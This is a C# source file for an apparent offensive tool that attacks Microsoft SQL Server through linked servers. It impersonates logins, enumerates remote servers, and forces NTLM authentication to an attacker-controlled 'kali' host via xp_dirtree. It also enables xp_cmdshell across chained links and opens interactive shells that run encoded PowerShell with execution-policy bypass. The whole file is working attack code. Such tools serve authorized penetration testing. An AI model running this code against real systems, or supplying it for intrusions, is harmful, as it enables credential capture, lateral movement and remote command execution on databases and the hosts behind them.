using System;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace sqlexec
{
    // Add double escaping function ('')
    public static class LinkedSqlOperations
    {
        public static void User(SqlConnection con, string linkedServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            string getUserRemote = $"EXEC('SELECT SYSTEM_USER') AT [{linkedServer}];";
            Console.WriteLine($"SQL Query: {getUserRemote}");
            ExecuteCommand(con, getUserRemote);
        }

        public static void Version(SqlConnection con, string linkedServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            string versionEnum = $"EXEC('SELECT @@VERSION') AT [{linkedServer}];";
            Console.WriteLine($"SQL Query: {versionEnum}");
            ExecuteCommand(con, versionEnum);
        }

        public static void Hostname(SqlConnection con, string linkedServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            string hostnameEnum = $"EXEC('SELECT @@SERVERNAME') AT [{linkedServer}];";
            Console.WriteLine($"SQL Query: {hostnameEnum}");
            ExecuteCommand(con, hostnameEnum);
        }

        public static void Query(SqlConnection con, string linkedServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            Boolean debug = false;
            Console.WriteLine("quit: exit the shell, debug: show SQL queries");
            Console.WriteLine("Double '' escaping might be needed!");
            while (true)
            {
                Console.Write("SQL > ");
                string cmd = Console.ReadLine();

                if (cmd == "debug")
                {
                    debug = !debug;
                    continue;
                }
                if (string.Equals(cmd, "quit", StringComparison.OrdinalIgnoreCase))
                {
                    break;
                }
                else
                {
                   string execCmd = $"EXEC('{cmd}') AT [{linkedServer}];";
                    if (debug == true)
                    {
                        Console.WriteLine($"SQL Query: {execCmd}\n");
                    }
                    ExecuteCommand(con, execCmd);
                }
            }
        }

        public static void UncPathInj(SqlConnection con, string linkedServer, string impersonate, string kali)
        {
            impersonateUser(con, impersonate);

            string xpdirtree = $"EXEC ('EXEC master..xp_dirtree \"\\\\{kali}\\\\upi\";') AT [{linkedServer}]";
            Console.WriteLine($"SQL Query: {xpdirtree}");
            ExecuteCommand(con, xpdirtree);
            Console.WriteLine("\nExecuted\n");
        }

        public static void Enable(SqlConnection con, string linkedServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            string enableadvoptions = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linkedServer}]";
            string enablexpcmdshell = $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedServer}]";
            Console.WriteLine($"SQL Query: {enableadvoptions}");
            Console.WriteLine($"SQL Query: {enablexpcmdshell}");
            ExecuteCommand(con, enableadvoptions);
            ExecuteCommand(con, enablexpcmdshell);
            Console.WriteLine("\nExecuted\n");
        }

        public static void Shell(SqlConnection con, string linkedServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            Boolean debug = false;
            Console.WriteLine("quit: exit the shell, debug: show SQL queries");
            while (true)
            {
                Console.Write("PS Enc > ");
                string cmd = Console.ReadLine();

                if (cmd == "debug")
                {
                    debug = !debug;
                    continue;
                }
                if (string.Equals(cmd, "quit", StringComparison.OrdinalIgnoreCase))
                {
                    break;
                }
                else
                {
                    string encodedCmd = EncodePs(cmd);
                    string execCmd = $"EXEC ('xp_cmdshell ''powershell -nop -ep bypass -enc {encodedCmd}'';') AT [{linkedServer}]";
                    if ( debug == true)
                    {
                        Console.WriteLine($"SQL Query: {execCmd}\n");
                    }
                    ExecuteCommand(con, execCmd);
                }
            }
        }

        public static void PrivEnable(SqlConnection con, string linkedServer, string sqlServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            string enableadvoptions = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{sqlServer}]') AT [{linkedServer}]";
            string enablexpcmdshell = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{sqlServer}]') AT [{linkedServer}]";
            Console.WriteLine($"SQL Query: {enableadvoptions}");
            Console.WriteLine($"SQL Query: {enablexpcmdshell}");
            ExecuteCommand(con, enableadvoptions);
            ExecuteCommand(con, enablexpcmdshell);
            Console.WriteLine("\nExecuted\n");
        }

        public static void PrivEsc(SqlConnection con, string linkedServer, string sqlServer, string impersonate)
        {
            impersonateUser(con, impersonate);

            Boolean debug = false;
            Console.WriteLine("quit: exit the shell, debug: show SQL queries");
            while (true)
            {
                Console.Write("PS Enc > ");
                string cmd = Console.ReadLine();

                if (cmd == "debug")
                {
                    debug = !debug;
                    continue;
                }
                if (string.Equals(cmd, "quit", StringComparison.OrdinalIgnoreCase))
                {
                    break;
                }
                else
                {
                    string encodedCmd = EncodePs(cmd);
                    string execCmd = $"EXEC (' EXEC (''xp_cmdshell ''''powershell -nop -ep bypass -enc {encodedCmd}'''';'') AT {sqlServer}') AT {linkedServer}";
                    if (debug == true)
                    {
                        Console.WriteLine($"SQL Query: {execCmd}\n");
                    }
                    ExecuteCommand(con, execCmd);
                }
            }
        }

        private static void ExecuteCommand(SqlConnection con, string commandText)
        {
            try 
            {
                using (SqlCommand command = new SqlCommand(commandText, con))
                {
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            for (int i = 0; i < reader.FieldCount; i++)
                            {
                                Console.WriteLine(reader[i]);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        private static void impersonateUser(SqlConnection con, string impersonate)
        {
            if (impersonate != null)
            {
                string impersonation = $"EXEC AS LOGIN = '{impersonate}';";
                Console.WriteLine($"SQL Query: {impersonation}");
                ExecuteCommand(con, impersonation);
            }
        }

        public static string EncodePs(string command)
        {
            byte[] commandBytes = Encoding.Unicode.GetBytes(command);
            string encodedCommandStr = Convert.ToBase64String(commandBytes);
            return encodedCommandStr;
        }
    }
}
